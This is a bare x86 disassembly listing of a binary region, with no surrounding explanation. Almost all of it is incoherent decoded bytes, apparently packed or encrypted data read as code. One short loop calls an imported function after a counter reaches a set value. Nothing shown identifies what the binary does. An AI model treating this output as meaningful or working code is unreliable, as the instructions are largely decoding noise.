  410ffe:	shl    DWORD PTR [ebp+0x44087967],cl
  411004:	test   BYTE PTR [ebp+0x33],dl
  411007:	pop    ebp
  411008:	inc    edi
  411009:	add    eax,0xe209dd27
  41100e:	adc    DWORD PTR [edx+0x205d3978],edx
  411014:	dec    DWORD PTR [esi+0x50]
  411017:	fimul  WORD PTR [edx+0x62]
  41101a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41101b:	jg     0x41108f
  41101d:	lods   eax,DWORD PTR ds:[esi]
  41101e:	ss adc cl,bh
  411021:	fistp  DWORD PTR [ecx+esi*8+0x22d41bf7]
  411028:	ds xchg bh,dl
  41102b:	sbb    BYTE PTR [eax],ch
  41102d:	or     DWORD PTR [ecx+ecx*4],0xf7c5d7a7
  411034:	dec    esi
  411035:	push   0xa35cc086
  41103a:	sbb    ebp,DWORD PTR [edi-0x3f]
  41103d:	fldenv [esi-0x6c]
  411040:	stos   BYTE PTR es:[edi],al
  411041:	xlat   BYTE PTR ds:[ebx]
  411042:	mov    eax,0xa260de18
  411047:	push   0x19
  411049:	inc    edi
  41104a:	push   cs
  41104b:	shl    DWORD PTR [esi-0x38f7e5c7],cl
  411051:	sbb    DWORD PTR [eax+0x5eaca47b],edx
  411057:	rcl    DWORD PTR [edi-0x66af54ca],cl
  41105d:	ds loopne 0x41109d
  411060:	shr    BYTE PTR [esi-0x8ce0aea],1
  411066:	xlat   BYTE PTR ds:[ebx]
  411067:	xchg   esp,eax
  411068:	fcomp  DWORD PTR [ebx+eax*4]
  41106b:	addr16 inc edx
  41106d:	push   ecx
  41106e:	pop    esp
  41106f:	adc    DWORD PTR [ecx+0x72253483],ecx
  411075:	sub    BYTE PTR [edi-0x35],dl
  411078:	dec    edi
  411079:	cmp    dl,BYTE PTR [ecx+eax*2-0x13]
  41107d:	push   esp
  41107e:	jo     0x411074
  411080:	xor    DWORD PTR [eax+0x73],ebx
  411083:	out    dx,al
  411084:	out    0x0,eax
  411086:	rol    DWORD PTR [ebx],1
  411088:	in     eax,dx
  411089:	(bad)  
  41108a:	push   esp
  41108b:	xchg   DWORD PTR ds:0x1b16fa5f,esi
  411091:	mov    ch,0x10
  411093:	inc    ebx
  411094:	fild   WORD PTR [ebx+ebp*8]
  411097:	test   eax,0xaa8d5ed8
  41109c:	int    0x3e
  41109e:	pop    ecx
  41109f:	aaa    
  4110a0:	enter  0xfadb,0x11
  4110a4:	jbe    0x4110a4
  4110a6:	add    al,0x30
  4110a8:	add    eax,0xccc88fad
  4110ad:	lds    ebx,FWORD PTR [edx-0x4531b060]
  4110b3:	fs jl  0x4110aa
  4110b6:	sbb    eax,0xfeac931c
  4110bb:	cld    
  4110bc:	pop    ds
  4110bd:	in     al,0x14
  4110bf:	jo     0x411066
  4110c1:	push   es
  4110c2:	inc    edi
  4110c3:	in     eax,dx
  4110c4:	jae    0x4110fc
  4110c6:	icebp  
  4110c7:	mov    ah,0x19
  4110c9:	xchg   edx,eax
  4110ca:	xchg   esi,eax
  4110cb:	mov    DWORD PTR [ebx+0x78],eax
  4110ce:	mov    bh,BYTE PTR [edx+0x13]
  4110d1:	or     BYTE PTR [edi],dh
  4110d3:	enter  0xd458,0x48
  4110d7:	mov    ebp,0x810303a6
  4110dc:	js     0x41113b
  4110de:	popa   
  4110df:	sahf   
  4110e0:	das    
  4110e1:	push   edi
  4110e2:	sub    eax,0xa3a154a3
  4110e7:	lods   eax,DWORD PTR ds:[esi]
  4110e8:	shl    DWORD PTR [eax],cl
  4110ea:	inc    ecx
  4110eb:	scas   eax,DWORD PTR es:[edi]
  4110ec:	fcomp  QWORD PTR [ebx+0x4e]
  4110ef:	sbb    al,0xa8
  4110f1:	cmp    eax,0xf2695b8f
  4110f6:	sub    al,0xd6
  4110f8:	fwait
  4110f9:	and    ecx,ebx
  4110fb:	adc    BYTE PTR [ebx],dl
  4110fd:	dec    eax
  4110fe:	mov    eax,ds:0xeb573022
  411103:	mov    ah,0x39
  411105:	test   ah,cl
  411107:	ins    BYTE PTR es:[edi],dx
  411108:	or     BYTE PTR [ecx],dl
  41110a:	cmp    esp,edi
  41110c:	div    edi
  41110e:	fnstsw WORD PTR [esi+eax*8+0x49]
  411112:	enter  0x26bf,0xa0
  411116:	xor    DWORD PTR [ecx],0xd23efd4d
  41111c:	mov    eax,ds:0x98c709d3
  411121:	adc    cl,BYTE PTR gs:[eax-0x33]
  411125:	leave  
  411126:	call   0xaba2:0x110e1a00
  41112d:	(bad)  
  41112e:	or     ah,ch
  411130:	inc    ecx
  411131:	test   DWORD PTR [edx-0x13],esp
  411134:	in     eax,0xd2
  411136:	sbb    DWORD PTR [edx-0x36dd9616],ebx
  41113c:	or     bh,cl
  41113e:	fsubr  st(3),st
  411140:	xor    bh,BYTE PTR [ecx+eiz*8-0x6f8824ca]
  411147:	nop
  411148:	xor    eax,0x7dff57a2
  41114d:	push   edi
  41114e:	jmp    0xb82e4201
  411153:	jns    0x4111b1
  411155:	jmp    0x411152
  411157:	pushf  
  411158:	outs   dx,BYTE PTR fs:[esi]
  41115a:	dec    edx
  41115b:	out    dx,al
  41115c:	xor    al,0x74
  41115e:	push   es
  41115f:	cmp    ch,BYTE PTR [edi]
  411161:	inc    edi
  411162:	leave  
  411163:	icebp  
  411164:	das    
  411165:	popf   
  411166:	out    dx,eax
  411167:	fdivr  DWORD PTR [ebx+0x3ac7260]
  41116d:	mov    dl,0xa1
  41116f:	ins    BYTE PTR es:[edi],dx
  411170:	loop   0x41112e
  411172:	jmp    0x755d807
  411177:	mov    BYTE PTR [eax-0xa],ah
  41117a:	sbb    BYTE PTR [edi],al
  41117c:	out    0x3,eax
  41117e:	cli    
  41117f:	sbb    al,0x27
  411181:	pop    es
  411182:	fwait
  411183:	out    dx,eax
  411184:	xchg   edi,eax
  411185:	scas   al,BYTE PTR es:[edi]
  411186:	mov    ds:0x7999fd32,al
  41118b:	jmp    0x41114b
  41118d:	loopne 0x411201
  41118f:	mul    BYTE PTR [ecx+0x43ac380a]
  411195:	test   eax,0x7f7156c3
  41119a:	mov    ds:0x790605dc,al
  41119f:	sbb    eax,0xb78b6e7b
  4111a4:	cwde   
  4111a5:	push   cs
  4111a6:	mov    ah,0x3a
  4111a8:	pop    ebx
  4111a9:	mov    dl,0xda
  4111ab:	sahf   
  4111ac:	and    al,0x29
  4111ae:	scas   al,BYTE PTR es:[edi]
  4111af:	cmp    edx,0x6d
  4111b2:	xlat   BYTE PTR ds:[ebx]
  4111b3:	add    BYTE PTR [esi-0x74],ch
  4111b6:	pop    es
  4111b7:	nop
  4111b8:	loopne 0x411170
  4111ba:	es mov ebx,0xf2519856
  4111c0:	mov    al,BYTE PTR [edi]
  4111c2:	rcl    BYTE PTR [ebx+0x2c4aae08],0x2f
  4111c9:	xchg   DWORD PTR [ebp-0x5bae2e39],ecx
  4111cf:	xor    eax,0x1067ae6c
  4111d4:	mov    al,ds:0xb69ad600
  4111d9:	mov    ebp,0x4a98c400
  4111de:	push   ss
  4111df:	mov    cl,0xfb
  4111e1:	add    eax,0x14520b93
  4111e6:	imul   ecx,DWORD PTR [ebp-0x74a4a495],0x7d
  4111ed:	mov    BYTE PTR [edi-0x48613b84],bh
  4111f3:	sti    
  4111f4:	aas    
  4111f5:	jo     0x411257
  4111f7:	int    0x41
  4111f9:	or     esi,DWORD PTR [esi]
  4111fb:	mov    al,ds:0xaa6420ca
  411200:	push   0xffffffc9
  411202:	adc    esi,DWORD PTR [ebx]
  411204:	sbb    ebp,DWORD PTR [eax+ebp*2-0x546342dd]
  41120b:	icebp  
  41120c:	pop    es
  41120d:	ror    ecx,1
  41120f:	outs   dx,DWORD PTR gs:[esi]
  411211:	xchg   esi,eax
  411212:	outs   dx,BYTE PTR ds:[esi]
  411213:	mul    dl
  411215:	add    eax,0xea96fc58
  41121a:	or     ch,ah
  41121c:	test   BYTE PTR [edi+0x5755baba],0xb9
  411223:	loop   0x41121e
  411225:	or     BYTE PTR [edx],bl
  411227:	jo     0x411218
  411229:	mov    al,ds:0xb5640e62
  41122e:	cli    
  41122f:	sbb    DWORD PTR [ebx-0x5e87be4],esi
  411235:	add    DWORD PTR [esp+eiz*4+0x38d59634],ebx
  41123c:	sahf   
  41123d:	cmp    DWORD PTR [ecx-0x6a],esi
  411240:	and    ah,BYTE PTR [ebx+ebx*2-0x677a889a]
  411247:	mov    dl,0x5a
  411249:	push   ecx
  41124a:	add    eax,0xd448946
  41124f:	shr    BYTE PTR [ebx-0x5eaefd1c],0xa9
  411256:	push   ss
  411257:	mov    BYTE PTR [ecx+0x5050d7c1],dl
  41125d:	inc    edi
  41125e:	pop    es
  41125f:	push   edi
  411260:	or     edx,edi
  411262:	hlt    
  411263:	lods   eax,DWORD PTR ds:[esi]
  411264:	pop    ds
  411265:	jne    0x411200
  411267:	mov    ebp,0x7e08a72d
  41126c:	xchg   ebx,eax
  41126d:	or     DWORD PTR [edi],ecx
  41126f:	xchg   ecx,eax
  411270:	dec    esp
  411271:	retf   
  411272:	les    esi,FWORD PTR [ebp+eiz*1-0x1f970b8f]
  411279:	fisttp WORD PTR [eax]
  41127b:	jmp    0xcee5:0xaa4f03fa
  411282:	fs ret 
  411284:	pop    ebx
  411285:	cs xor dl,bh
  411288:	test   DWORD PTR [edx+edx*1-0x46f9ae49],esp
  41128f:	xchg   esp,eax
  411290:	lods   eax,DWORD PTR ds:[esi]
  411291:	or     dh,BYTE PTR [ebx-0x35]
  411294:	call   0x3e3b80ab
  411299:	sub    BYTE PTR [edi+0x181bbd2f],al
  41129f:	in     al,dx
  4112a0:	xor    al,0xef
  4112a2:	inc    edi
  4112a3:	xor    DWORD PTR [ebp-0x57],eax
  4112a6:	pop    edi
  4112a7:	cdq    
  4112a8:	mov    WORD PTR [eax-0x78b4c189],ds
  4112ae:	clc    
  4112af:	push   edx
  4112b0:	shr    BYTE PTR [edi],1
  4112b2:	int    0xcf
  4112b4:	add    BYTE PTR [edx],cl
  4112b6:	ret    
  4112b7:	(bad)  
  4112b9:	jmp    0xa4e5:0x13a2456d
  4112c0:	cmp    al,0x63
  4112c2:	loop   0x411320
  4112c4:	mov    bh,0x20
  4112c6:	jmp    0x411327
  4112c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c9:	cmp    eax,0xa40b8e3
  4112ce:	or     BYTE PTR [eax+0x58050582],cl
  4112d4:	fwait
  4112d5:	(bad)  
  4112d6:	js     0x411321
  4112d8:	cmp    eax,0x51165d5e
  4112dd:	aam    0x6d
  4112df:	(bad)  
  4112e0:	out    dx,al
  4112e1:	mov    esi,0xf215d04a
  4112e6:	cs add al,0xd7
  4112e9:	fcmovnu st,st(1)
  4112eb:	mov    dh,0xdd
  4112ed:	pop    ecx
  4112ee:	cmp    bl,BYTE PTR [edi-0x4f]
  4112f1:	sbb    eax,0x4ca344ef
  4112f6:	add    al,0xf4
  4112f8:	pop    eax
  4112f9:	jbe    0x4112dc
  4112fb:	jns    0x411295
  4112fd:	out    0xad,al
  4112ff:	mov    al,0xf7
  411301:	xchg   dl,cl
  411303:	mov    ?,WORD PTR [edx-0x67]
  411306:	xor    DWORD PTR [esi+0x42cdee1b],0x3bf96fd0
  411310:	mov    cl,dl
  411312:	pushf  
  411313:	mov    eax,ds:0x69324be
  411318:	(bad)  
  411319:	push   cs
  41131a:	(bad)  
  41131b:	push   ds
  41131c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41131d:	int    0x8d
  41131f:	jmp    0x255c:0xb0a55b7b
  411326:	inc    edi
  411327:	mov    dl,0x28
  411329:	add    DWORD PTR [edx-0x2b98063b],0x3e8b6f23
  411333:	jl     0x4113b4
  411335:	test   ah,cl
  411337:	pop    ss
  411338:	mov    esi,0x6282326e
  41133d:	sahf   
  41133e:	add    esi,DWORD PTR [eax+0x73]
  411341:	fs mov dl,0xc0
  411344:	call   0x48a3:0xd6860987
  41134b:	push   ecx
  41134c:	fist   DWORD PTR [eax+0x41]
  41134f:	push   ss
  411350:	int3   
  411351:	xchg   edi,eax
  411352:	push   ecx
  411353:	ds ins BYTE PTR es:[edi],dx
  411355:	push   0x3
  411357:	lods   eax,DWORD PTR ds:[esi]
  411358:	pop    edi
  411359:	push   0x15
  41135b:	pop    eax
  41135c:	mov    BYTE PTR [edi],bl
  41135e:	lea    ebp,[ebx+esi*8]
  411361:	xrelease xchg BYTE PTR [ebx+0x17],al
  411365:	gs jg  0x411351
  411368:	enter  0xc39d,0xd6
  41136c:	dec    esi
  41136d:	or     ebx,DWORD PTR [edi]
  41136f:	fwait
  411370:	pushf  
  411371:	fidivr DWORD PTR [ecx+0x272e3107]
  411377:	jl     0x4113ce
  411379:	stc    
  41137a:	cmp    DWORD PTR [edx-0x7214b1df],edi
  411380:	or     al,0xe2
  411382:	or     DWORD PTR [edx-0x5ea6ad77],eax
  411388:	(bad)  
  411389:	jae    0x411401
  41138b:	xchg   esp,eax
  41138c:	mov    al,ds:0x5431c2a3
  411391:	or     esp,DWORD PTR [edi-0x8622b35]
  411397:	bound  esi,QWORD PTR [edx]
  411399:	shl    DWORD PTR [edi-0x77073a41],0xab
  4113a0:	mov    dl,0x50
  4113a2:	pop    edx
  4113a3:	mov    esi,0x38eebefa
  4113a8:	sub    eax,0x79fba5b5
  4113ad:	dec    eax
  4113ae:	mov    ch,0x9d
  4113b0:	mov    esi,0x4d6f6211
  4113b5:	test   eax,0xb560b483
  4113ba:	dec    ebx
  4113bb:	xor    ebp,DWORD PTR [ebx]
  4113bd:	mov    dl,0xab
  4113bf:	je     0x411342
  4113c1:	jl     0x4113b7
  4113c3:	imul   edi,DWORD PTR [ebx],0xf105c7c6
  4113c9:	cld    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	jle    0x411469
  411449:	pop    esi
  41144a:	inc    ebx
  41144b:	push   cs
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x411407
  411454:	xor    eax,0x71455829
  411459:	inc    ecx
  41145a:	xor    al,0x88
  41145c:	mov    ecx,0x33a9a4a5
  411461:	fs cmc 
  411463:	jne    0x411405
  411465:	dec    ebx
  411466:	jmp    0x4114a6
  411468:	leave  
  411469:	aaa    
  41146a:	cmp    edx,DWORD PTR [edi]
  41146c:	mov    ch,0xad
  41146e:	or     cl,BYTE PTR gs:[ebp-0x5183813c]
  411475:	inc    ecx
  411477:	nop
  411478:	iret   
  411479:	gs ins BYTE PTR es:[di],dx
  41147c:	sub    ebx,DWORD PTR [edx+eax*2+0x1f]
  411480:	dec    ecx
  411481:	mov    ds:0x76dcd037,al
  411486:	pop    ebp
  411487:	loop   0x4114ce
  411489:	push   es
  41148a:	cli    
  41148b:	sub    ch,dh
  41148d:	(bad)  
  41148e:	jbe    0x4114c3
  411490:	add    al,al
  411492:	fld    DWORD PTR [ebp+eax*1-0x37]
  411496:	pop    edi
  411497:	mov    esi,DWORD PTR [ecx+esi*4]
  41149a:	sub    eax,0x5c3c4c8f
  41149f:	nop
  4114a0:	mov    ebp,0x67e37f7e
  4114a5:	lods   al,BYTE PTR ds:[esi]
  4114a6:	mov    eax,ds:0xb93278d0
  4114ab:	ja     0x4114e5
  4114ad:	cmp    dl,BYTE PTR [edi+0xa]
  4114b0:	outs   dx,BYTE PTR ds:[esi]
  4114b1:	inc    esi
  4114b2:	test   al,0x53
  4114b4:	repz dec edx
  4114b6:	les    esi,FWORD PTR [ebx-0x7b]
  4114b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114ba:	cmp    BYTE PTR [ecx],cl
  4114bc:	or     BYTE PTR ds:0xde47eedd,al
  4114c2:	pushf  
  4114c3:	int    0xd6
  4114c5:	mov    eax,esi
  4114c7:	push   ecx
  4114c8:	push   ecx
  4114c9:	fcom   DWORD PTR [edi+ecx*4-0x62495dbd]
  4114d0:	dec    ebx
  4114d1:	add    DWORD PTR [ebp-0x1d],ecx
  4114d4:	(bad)  
  4114d5:	or     cl,bl
  4114d7:	je     0x4114ca
  4114d9:	xor    BYTE PTR [ecx-0x2c],al
  4114dc:	les    edx,FWORD PTR [edx-0x62]
  4114df:	call   0xe8e58b89
  4114e4:	xchg   ebp,eax
  4114e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e6:	push   esi
  4114e7:	jne    0x4114f7
  4114e9:	jle    0x411559
  4114eb:	push   ss
  4114ec:	aaa    
  4114ed:	sub    al,0xf2
  4114ef:	lods   eax,DWORD PTR ds:[esi]
  4114f0:	adc    ecx,DWORD PTR [ecx+eiz*8]
  4114f3:	aam    0x6b
  4114f5:	shr    BYTE PTR [ebp+0x7348998c],0xfe
  4114fc:	sbb    al,0x9c
  4114fe:	dec    edx
  4114ff:	push   ds
  411500:	repz mov cl,0x16
  411503:	pop    ds
  411504:	addr16 jne 0x4114f3
  411507:	jne    0x41152f
  411509:	(bad)  [edi-0x50c16225]
  41150f:	inc    edx
  411510:	push   ss
  411511:	push   0x84d85314
  411516:	add    eax,0x2bd0ed0b
  41151b:	inc    ebp
  41151c:	js     0x411522
  41151e:	lds    bp,DWORD PTR [eax-0x5e]
  411522:	dec    ebx
  411523:	mov    eax,0x75d1a422
  411529:	mov    eax,ds:0x4f9f0fff
  41152e:	and    DWORD PTR [esp+ebp*1+0x71238879],esp
  411535:	add    al,bl
  411537:	jecxz  0x411595
  411539:	xchg   edi,esi
  41153b:	xor    dh,BYTE PTR [esi+0x6]
  41153e:	rcr    al,0x64
  411541:	inc    esp
  411542:	in     al,0xde
  411544:	push   ebx
  411545:	out    dx,al
  411546:	mov    edx,0xa635853c
  41154b:	or     al,0xf4
  41154d:	test   eax,0x242e1766
  411552:	fadd   st(6),st
  411554:	mov    esi,0xd9c4e912
  411559:	mov    bl,0xd9
  41155b:	das    
  41155c:	xchg   dh,dh
  41155e:	es daa 
  411560:	mov    ebp,0x190c7f2
  411565:	mov    ds:0x57b6027a,al
  41156a:	lods   eax,DWORD PTR ds:[esi]
  41156b:	jp     0x411516
  41156d:	in     eax,0xe3
  41156f:	cmp    al,BYTE PTR [edi-0x302bb7e0]
  411575:	add    eax,0x61de38ad
  41157a:	call   0x5af65d73
  41157f:	xchg   ebx,eax
  411580:	ret    
  411581:	mov    ah,0x8c
  411583:	mov    bh,0x1d
  411585:	fstp   DWORD PTR [ebx-0x652e58b6]
  41158b:	inc    edi
  41158c:	sub    esi,DWORD PTR [ecx]
  41158e:	xchg   ebp,eax
  41158f:	add    al,0x72
  411591:	in     eax,dx
  411592:	fisub  DWORD PTR [ebx]
  411594:	(bad)  
  411595:	jl     0x41159f
  411597:	std    
  411598:	popf   
  411599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41159a:	stc    
  41159b:	repnz pushf 
  41159d:	lahf   
  41159e:	popa   
  41159f:	mov    edx,0x29d98243
  4115a4:	mov    cl,0xb8
  4115a6:	cwde   
  4115a7:	and    DWORD PTR [ebx-0x6f],edi
  4115aa:	add    eax,0x64be4559
  4115af:	or     bh,al
  4115b1:	dec    esp
  4115b2:	fcmovu st,st(4)
  4115b4:	mov    esi,ecx
  4115b6:	sar    BYTE PTR [edx],1
  4115b8:	sbb    BYTE PTR [eax],ah
  4115ba:	in     al,0xc3
  4115bc:	adc    BYTE PTR [ebp+0x6a702636],al
  4115c2:	(bad)  
  4115c3:	dec    ecx
  4115c4:	mov    bh,al
  4115c6:	jge    0x411591
  4115c8:	push   ds
  4115c9:	mov    esp,0xdd2c10a9
  4115ce:	gs aas 
  4115d0:	pop    ecx
  4115d1:	or     BYTE PTR [ebx],al
  4115d3:	push   eax
  4115d4:	push   ecx
  4115d5:	daa    
  4115d6:	data16 (bad) 
  4115d8:	cwde   
  4115d9:	fcomp  DWORD PTR [edi]
  4115db:	retf   0xffa1
  4115de:	(bad)  [ecx]
  4115e0:	adc    eax,0x4eb2014d
  4115e5:	jo     0x4115c1
  4115e7:	xchg   esp,eax
  4115e8:	dec    edi
  4115e9:	and    BYTE PTR [ebp+0x46f8039c],bh
  4115ef:	pop    eax
  4115f0:	fs es inc edi
  4115f3:	and    BYTE PTR [edx],bh
  4115f5:	call   0x991e:0xdcfb99e3
  4115fc:	daa    
  4115fd:	in     al,0xf9
  4115ff:	jp     0x4115d7
  411601:	or     al,0x69
  411603:	mov    dh,0x71
  411605:	imul   ecx,DWORD PTR ds:0x8eec56e6,0x2c
  41160c:	push   cs
  41160d:	sub    ebp,edx
  41160f:	stos   DWORD PTR es:[edi],eax
  411610:	jmp    0x4115a4
  411612:	ins    DWORD PTR es:[edi],dx
  411613:	mov    dh,0x52
  411615:	popa   
  411616:	adc    DWORD PTR [esi-0x3746487b],0x5c0433f0
  411620:	scas   eax,DWORD PTR es:[edi]
  411621:	mov    bh,0x54
  411623:	js     0x41166f
  411625:	retf   
  411626:	in     al,dx
  411627:	fsub   DWORD PTR [edx-0x288d6a74]
  41162d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41162e:	or     eax,DWORD PTR [eax-0x51aeef23]
  411634:	test   BYTE PTR gs:0xce020692,dl
  41163b:	or     eax,0x681f023
  411640:	stos   BYTE PTR es:[edi],al
  411641:	xor    BYTE PTR [edx+0x27a2bcba],ah
  411647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411648:	fidiv  DWORD PTR [ecx+0x70]
  41164b:	sub    eax,0x2e6fea77
  411650:	push   edx
  411651:	js     0x411633
  411653:	sub    al,0xd7
  411655:	inc    edx
  411656:	pop    esp
  411657:	cmp    BYTE PTR [esi],al
  411659:	in     al,0x6e
  41165b:	cmp    eax,0x9041534a
  411660:	xchg   ebp,eax
  411661:	pop    ecx
  411662:	repnz mov ds:0x1686ffb4,al
  411668:	inc    edi
  411669:	call   0xdb5fc2c0
  41166e:	jnp    0x411630
  411670:	mov    esi,DWORD PTR [esi+eiz*1+0x54293e27]
  411677:	fwait
  411678:	ins    DWORD PTR es:[edi],dx
  411679:	add    cl,BYTE PTR [ebp+0x5f]
  41167c:	mov    edx,0xad018d6c
  411681:	bnd jp 0x41167c
  411684:	sub    dl,bl
  411686:	xchg   esi,eax
  411687:	sbb    eax,0x5e241db5
  41168c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41168d:	mov    ah,0x18
  41168f:	aas    
  411690:	xor    al,0x47
  411692:	out    dx,eax
  411693:	xor    al,0x58
  411695:	jmp    0x4116ed
  411697:	pushf  
  411698:	xchg   DWORD PTR [ebx-0x72],esi
  41169b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41169c:	mov    edx,0xdbee7915
  4116a1:	jbe    0x41165c
  4116a3:	out    0xd2,eax
  4116a5:	sbb    esi,DWORD PTR [ebx+0x6b]
  4116a8:	sbb    DWORD PTR [edi+ecx*4+0x6b76e34f],0x18
  4116b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116b1:	retf   
  4116b2:	les    eax,FWORD PTR [esi-0x5b]
  4116b5:	mov    ebx,0x604c2070
  4116ba:	in     al,0x32
  4116bc:	adc    BYTE PTR ds:0x945b25b9,bh
  4116c2:	stos   BYTE PTR es:[edi],al
  4116c3:	mov    ebx,0x14e44d38
  4116c8:	repz cmp bl,BYTE PTR [edx-0x6cd53580]
  4116cf:	adc    bl,ch
  4116d1:	popf   
  4116d2:	xchg   edi,eax
  4116d3:	push   ebx
  4116d4:	cmp    edx,edi
  4116d6:	push   edx
  4116d7:	sbb    al,0x3c
  4116d9:	or     DWORD PTR [edi],edx
  4116db:	xchg   edx,eax
  4116dc:	out    0xbc,eax
  4116de:	iret   
  4116df:	fs push ecx
  4116e1:	(bad)  
  4116e2:	mov    edx,DWORD PTR ds:[edi]
  4116e5:	jecxz  0x411677
  4116e7:	adc    dh,bl
  4116e9:	push   ss
  4116ea:	dec    edx
  4116eb:	add    bl,ah
  4116ed:	pop    eax
  4116ee:	cmp    ch,BYTE PTR ds:0x92b04fe0
  4116f4:	push   ebp
  4116f5:	ins    DWORD PTR es:[edi],dx
  4116f6:	ins    BYTE PTR es:[edi],dx
  4116f7:	jns    0x411714
  4116f9:	test   eax,0xae4af50c
  4116fe:	dec    edx
  4116ff:	jle    0x41171c
  411701:	sbb    BYTE PTR [edx],0xfc
  411704:	popf   
  411705:	shl    esp,0x56
  411708:	scas   al,BYTE PTR es:[edi]
  411709:	(bad)
  41170d:	data16 clc 
  41170f:	call   0x35a2866f
  411714:	es jl  0x411779
  411717:	sahf   
  411718:	cdq    
  411719:	shl    BYTE PTR [ebp+0x74bf66ce],cl
  41171f:	inc    eax
  411720:	das    
  411721:	jbe    0x411724
  411723:	or     al,0xdd
  411725:	or     eax,0x916213bd
  41172a:	xchg   cl,al
  41172c:	enter  0xf86a,0xd9
  411730:	outs   dx,BYTE PTR ds:[esi]
  411731:	test   eax,0x1bebb803
  411736:	loopne 0x4116e2
  411738:	mov    esp,0xddb0588d
  41173d:	mov    bl,0xf9
  41173f:	lods   eax,DWORD PTR ds:[esi]
  411740:	mov    cl,BYTE PTR [ebp+0x2d68dc28]
  411746:	rcl    DWORD PTR [ecx],cl
  411748:	mov    bl,BYTE PTR [eax-0x987ae60]
  41174e:	test   DWORD PTR [edx-0x1f],esi
  411751:	add    edx,DWORD PTR [esi+0x16]
  411754:	test   eax,0xd08c2e04
  411759:	inc    ebp
  41175a:	mov    dh,0x5
  41175c:	psubsw mm6,QWORD PTR [edi+0x7e]
  411760:	cld    
  411761:	(bad)  
  411762:	out    0x79,al
  411764:	xor    ecx,ecx
  411766:	(bad)  
  411767:	into   
  411768:	pop    esi
  411769:	shl    BYTE PTR [edi],cl
  41176b:	rol    DWORD PTR [ecx-0x547c7469],0x65
  411772:	popa   
  411773:	xchg   BYTE PTR [eax-0x2f],dh
  411776:	push   ecx
  411777:	xchg   edi,eax
  411778:	mov    ecx,0x96fb2dc0
  41177d:	push   edx
  41177e:	in     eax,dx
  41177f:	rcr    BYTE PTR [ebp+0x2f1a86b],1
  411785:	push   ebx
  411786:	xchg   edx,eax
  411787:	sub    al,0x7f
  411789:	push   edi
  41178a:	outs   dx,BYTE PTR ds:[esi]
  41178b:	in     al,dx
  41178c:	or     eax,0xe32bfed9
  411791:	fist   DWORD PTR [ecx]
  411793:	(bad)  
  411794:	pop    esi
  411795:	call   0x8003:0x830a54cc
  41179c:	ficomp WORD PTR [esi]
  41179e:	mov    al,ds:0x8c039d13
  4117a3:	inc    ebx
  4117a4:	outs   dx,BYTE PTR ds:[esi]
  4117a5:	imul   DWORD PTR [edx-0x6e]
  4117a8:	cmp    al,0xaf
  4117aa:	dec    esi
  4117ab:	lahf   
  4117ac:	int    0x30
  4117ae:	(bad)  [ebp+0xeb51855]
  4117b4:	sub    BYTE PTR [ebx-0x524992a7],0x8e
  4117bb:	bound  ebp,QWORD PTR [esi+0x69064f59]
  4117c1:	mov    dh,0xb0
  4117c3:	mov    ebp,0x2193abdd
  4117c8:	repnz mov eax,DWORD PTR [eax+eax*2+0x7b]
  4117cd:	je     0x41179c
  4117cf:	aas    
  4117d0:	jo     0x41184c
  4117d2:	mov    edi,0x420d1830
  4117d7:	sub    BYTE PTR ds:0xbebd4cb3,bh
  4117dd:	loope  0x4117a7
  4117df:	hlt    
  4117e0:	fldlg2 
  4117e2:	shl    BYTE PTR [eax+0x1a33791c],0x39
  4117e9:	jmp    0x7af8:0x7f306e8b
  4117f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117f1:	sbb    ecx,DWORD PTR [esi-0x6d]
  4117f4:	test   BYTE PTR [edi+eiz*8+0x6aa6a92e],bh
  4117fb:	lds    esp,FWORD PTR [ebx+ebx*2+0x39]
  4117ff:	dec    edx
  411800:	adc    BYTE PTR [ebx],al
  411802:	retf   0x2ce0
  411805:	jmp    esi
  411807:	fwait
  411808:	std    
  411809:	outs   dx,DWORD PTR ds:[esi]
  41180a:	sbb    cl,BYTE PTR [edi+ecx*2]
  41180d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41180e:	sbb    al,0xfc
  411810:	scas   eax,DWORD PTR es:[edi]
  411811:	mov    cl,0xe6
  411813:	ja     0x41182a
  411815:	xchg   edx,eax
  411816:	leave  
  411817:	inc    esi
  411818:	cli    
  411819:	test   BYTE PTR [esi+eax*2-0x40b48e5b],bl
  411820:	sub    BYTE PTR [ecx-0x2c4c96d2],al
  411826:	xchg   esi,eax
  411827:	xchg   DWORD PTR [ebx+0x4e],esp
  41182a:	xor    esp,esp
  41182c:	push   es
  41182d:	hlt    
  41182e:	mov    ebp,0x4ae60d55
